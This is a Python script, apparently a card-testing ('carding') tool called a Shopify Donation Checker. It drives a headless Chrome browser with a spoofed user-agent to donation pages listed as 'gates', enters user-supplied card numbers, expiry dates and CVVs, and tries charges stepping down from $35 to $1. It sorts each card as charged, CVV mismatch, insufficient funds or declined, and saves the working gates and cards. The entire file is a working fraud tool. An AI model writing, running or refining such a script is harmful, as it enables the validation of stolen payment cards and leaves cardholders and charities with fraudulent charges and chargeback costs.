#!/usr/bin/env python3
"""
Shopify Donation Checker - Browser Automation
No API keys needed - just fills forms like a real user!
"""

import json
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.table import Table

console = Console()

# Exponential backoff amounts
BACKOFF_AMOUNTS = [35.00, 25.00, 14.99, 4.99, 2.00, 1.00]

class CardData:
    def __init__(self, number, month, year, cvv):
        self.number = number
        self.month = month
        self.year = year
        self.cvv = cvv
    
    @classmethod
    def from_string(cls, s):
        parts = s.split('|')
        if len(parts) != 4:
            raise ValueError("Invalid format. Use: number|month|year|cvv")
        return cls(parts[0], parts[1], parts[2], parts[3])
    
    def masked(self):
        return f"{self.number[:6]}...{self.number[-3:]}"


def setup_driver():
    """Setup headless Chrome driver"""
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--window-size=1920,1080')
    options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
    
    driver = webdriver.Chrome(options=options)
    driver.set_page_load_timeout(30)
    return driver


def try_donation(driver, card, gate_url, amount):
    """Try to make a donation with given amount"""
    try:
        # Navigate to donation page
        driver.get(gate_url)
        time.sleep(3)
        
        # Try to find and fill amount field
        amount_selectors = [
            "input[name*='amount']",
            "input[id*='amount']",
            "input[name*='donation']",
            "input[id*='donation']",
            "input[type='number']",
            "#amount",
            "#donation-amount",
            "#custom-amount"
        ]
        
        amount_filled = False
        for selector in amount_selectors:
            try:
                element = WebDriverWait(driver, 2).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                )
                element.clear()
                element.send_keys(str(amount))
                amount_filled = True
                break
            except:
                continue
        
        # If no input field, try clicking amount button
        if not amount_filled:
            try:
                buttons = driver.find_elements(By.CSS_SELECTOR, "button, a, div[role='button']")
                for button in buttons:
                    if f"${amount}" in button.text or str(amount) in button.text:
                        button.click()
                        amount_filled = True
                        break
            except:
                pass
        
        time.sleep(2)
        
        # Switch to Stripe iframe if present
        try:
            iframe = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[name*='stripe'], iframe[src*='stripe']"))
            )
            driver.switch_to.frame(iframe)
            
            # Fill card in iframe
            card_input = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='cardnumber'], input[placeholder*='Card']"))
            )
            card_input.send_keys(card.number)
            
            # Expiry
            try:
                exp_input = driver.find_element(By.CSS_SELECTOR, "input[name='exp-date'], input[placeholder*='MM']")
                exp_input.send_keys(f"{card.month}{card.year[2:]}")
            except:
                pass
            
            # CVV
            try:
                cvv_input = driver.find_element(By.CSS_SELECTOR, "input[name='cvc'], input[placeholder*='CVC']")
                cvv_input.send_keys(card.cvv)
            except:
                pass
            
            driver.switch_to.default_content()
            
        except:
            # No iframe, fill directly
            card_selectors = [
                "input[name*='card']",
                "input[id*='card']",
                "input[autocomplete='cc-number']"
            ]
            
            for selector in card_selectors:
                try:
                    element = driver.find_element(By.CSS_SELECTOR, selector)
                    element.send_keys(card.number)
                    break
                except:
                    continue
            
            # Month
            try:
                month_input = driver.find_element(By.CSS_SELECTOR, "input[name*='month'], select[name*='month']")
                month_input.send_keys(card.month)
            except:
                pass
            
            # Year
            try:
                year_input = driver.find_element(By.CSS_SELECTOR, "input[name*='year'], select[name*='year']")
                year_input.send_keys(card.year)
            except:
                pass
            
            # CVV
            try:
                cvv_input = driver.find_element(By.CSS_SELECTOR, "input[name*='cvv'], input[name*='cvc']")
                cvv_input.send_keys(card.cvv)
            except:
                pass
        
        # Fill email and name
        try:
            email = driver.find_element(By.CSS_SELECTOR, "input[type='email'], input[name*='email']")
            email.send_keys("donor@example.com")
        except:
            pass
        
        try:
            name = driver.find_element(By.CSS_SELECTOR, "input[name*='name'], input[id*='name']")
            name.send_keys("Test Donor")
        except:
            pass
        
        time.sleep(2)
        
        # Find and click submit button
        submit_selectors = [
            "button[type='submit']",
            "input[type='submit']",
            "button:contains('Donate')",
            "button:contains('Submit')",
            "button:contains('Pay')",
            "#submit",
            "#donate-button"
        ]
        
        for selector in submit_selectors:
            try:
                button = driver.find_element(By.CSS_SELECTOR, selector)
                button.click()
                break
            except:
                continue
        
        # Wait for response
        time.sleep(5)
        
        # Analyze page content
        page_source = driver.page_source.lower()
        
        # Success indicators
        if any(word in page_source for word in ['thank you', 'success', 'donation received', 'payment successful']):
            return "CHARGED"
        
        # CVV mismatch
        cvv_indicators = [
            'incorrect_cvc', 'invalid_cvc', 'incorrect cvc', 'invalid cvc',
            'security code is incorrect', 'security code is invalid',
            'cvv is incorrect', 'cvc is incorrect'
        ]
        if any(indicator in page_source for indicator in cvv_indicators):
            return "CVV_MISMATCH"
        
        # Insufficient funds
        if 'insufficient funds' in page_source or 'insufficient_funds' in page_source:
            return "INSUFFICIENT_FUNDS"
        
        # Declined
        return "DECLINED"
        
    except Exception as e:
        return f"ERROR: {str(e)}"


def check_card_on_gate(driver, card, gate):
    """Check card on gate with exponential backoff"""
    console.print(f"\n[yellow]Testing gate: {gate['url']}[/yellow]")
    
    for amount in BACKOFF_AMOUNTS:
        console.print(f"  [cyan]→[/cyan] Trying ${amount}... ", end="")
        
        status = try_donation(driver, card, gate['url'], amount)
        
        if status in ["CHARGED", "CVV_MISMATCH", "INSUFFICIENT_FUNDS"]:
            console.print(f"[green]✓ {status}![/green]")
            return {
                'gate': gate['url'],
                'card': card.masked(),
                'amount': amount,
                'status': status,
                'success': True
            }
        else:
            console.print(f"[red]✗ {status}[/red]")
        
        time.sleep(2)
    
    console.print(f"  [red]✗ Declined at all amounts[/red]")
    return None


def main():
    console.print("\n[bold cyan]🛍️  Shopify Donation Checker (Browser Automation)[/bold cyan]")
    console.print("[dim]No API keys needed - fills forms like a real user![/dim]\n")
    
    # Load donation gates
    try:
        with open('donation_gates.json', 'r') as f:
            gates = json.load(f)
    except FileNotFoundError:
        console.print("[red]✗ donation_gates.json not found. Run gate_analyzer.py first![/red]")
        return
    
    console.print(f"[green]✓[/green] Loaded {len(gates)} donation gates\n")
    
    # Get cards from user
    console.print("[yellow]Enter cards (format: number|month|year|cvv)[/yellow]")
    console.print("[dim]Press Enter on empty line when done[/dim]\n")
    
    cards = []
    while True:
        card_input = input("Card: ").strip()
        if not card_input:
            break
        
        try:
            card = CardData.from_string(card_input)
            console.print(f"[green]✓[/green] Added: {card.masked()}")
            cards.append(card)
        except ValueError as e:
            console.print(f"[red]✗ {e}[/red]")
    
    if not cards:
        console.print("[red]No cards entered[/red]")
        return
    
    # Ask how many gates to test
    max_gates_input = input("\nHow many gates to test? (default: all): ").strip()
    max_gates = int(max_gates_input) if max_gates_input else len(gates)
    max_gates = min(max_gates, len(gates))
    
    gates_to_test = gates[:max_gates]
    
    console.print(f"\n[green]✓[/green] Will test {len(cards)} card(s) on {len(gates_to_test)} gate(s)")
    console.print(f"[cyan]→[/cyan] Strategy: $35 → $25 → $14.99 → $4.99 → $2 → $1\n")
    
    proceed = input("Proceed? (y/n): ").strip().lower()
    if proceed != 'y':
        return
    
    # Setup browser
    console.print("\n[cyan]→[/cyan] Launching headless Chrome...")
    driver = setup_driver()
    console.print("[green]✓[/green] Browser ready\n")
    
    # Check cards
    all_results = []
    
    try:
        for card in cards:
            console.print(f"\n[bold cyan]═══ Testing card: {card.masked()} ═══[/bold cyan]")
            
            for gate in gates_to_test:
                result = check_card_on_gate(driver, card, gate)
                if result:
                    all_results.append(result)
                time.sleep(3)
    
    finally:
        driver.quit()
    
    # Display results
    console.print("\n" + "═" * 60)
    console.print("[bold green]✅ FINAL RESULTS[/bold green]")
    console.print("═" * 60 + "\n")
    
    if not all_results:
        console.print("[red]❌ No successful charges found[/red]")
        console.print("[yellow]All cards declined on all gates[/yellow]")
    else:
        # Group by amount
        by_amount = {}
        for result in all_results:
            amount_key = f"{result['amount']:.2f}"
            if amount_key not in by_amount:
                by_amount[amount_key] = []
            by_amount[amount_key].append(result)
        
        # Sort by amount (descending)
        for amount_str in sorted(by_amount.keys(), key=lambda x: float(x), reverse=True):
            results = by_amount[amount_str]
            console.print(f"[bold yellow]💰 ${amount_str} Gates ({len(results)} found):[/bold yellow]")
            
            for result in results:
                console.print(f"  [green]✓[/green] {result['gate']}")
                console.print(f"    Card: {result['card']}")
                console.print(f"    Status: [green]{result['status']}[/green]\n")
        
        # Save results
        with open('checker_results.json', 'w') as f:
            json.dump(all_results, f, indent=2)
        console.print("[green]✓[/green] Results saved to checker_results.json")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"\n[red]💥 Error: {e}[/red]")
